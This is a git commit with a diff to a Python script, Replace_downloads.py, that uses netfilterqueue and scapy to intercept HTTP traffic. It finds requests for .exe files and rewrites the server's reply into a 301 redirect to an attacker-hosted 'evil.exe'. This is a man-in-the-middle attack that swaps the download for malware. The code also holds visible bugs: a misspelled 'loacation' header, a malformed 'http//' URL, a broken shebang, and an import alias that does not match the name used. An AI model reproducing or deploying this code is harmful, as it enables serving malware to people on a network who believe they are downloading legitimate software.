106bc47c6e2b1c6ecfa609645e3f1d9c650862d8
Shane Calder <shanescottcalder@gmail.com>
2018-07-23 14:48:57 -0600

    Add files via upload
    added:
    HTTP 301 redirect 
    target url for .exe (non working link used as example)
    clean up IP len and chksum
    clean up TCP chksum

--- Replace_downloads.py
+++ Replace_downloads.py
@@ -1,4 +1,4 @@
-#1/usr/bin/env python3
+#1/usr/bin/env python
 
 import netfilterqueue
 import scapy.all as scrapy
@@ -12,12 +12,17 @@ def process_packet(packet):
             if '.exe' in scapy_packet[scapy.Raw].load:
                 print('[+] exe Request')
                 ack_list.append(scapy_packet[scapy.TCP].ack)
-                print(scapy_packet.show())
+
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print('[+] Replacing file')
-                print(scapy_packet.show())
+                #HTTP 301 redirect and add target url.
+                scapy_packet[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\nloacation: http//10.0.2.1/evil.exe\n\n'
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].chksum
+                packet.set_payload(str(scapy_packet))
 
     packet.accept()
 
